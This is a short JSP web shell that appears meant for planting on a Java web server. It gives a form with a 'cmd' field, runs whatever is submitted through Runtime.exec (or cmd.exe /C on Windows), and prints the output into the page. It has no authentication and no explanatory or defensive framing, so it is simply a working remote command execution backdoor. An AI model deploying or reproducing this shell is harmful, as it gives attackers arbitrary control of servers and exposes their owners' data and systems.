<%@ page import="java.util.*,java.io.*"%>
<html><body>
cmd shell
<form method="get" name="tester" action="">
    <input type="text" name="cmd">
    <input type="submit" value="execute">
</form>
<pre>
<%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p;
        if (System.getProperty("os.name").toLowerCase().contains("windows")){
            p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
        }
        else{
            p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
%>
</pre>
</BODY></HTML>
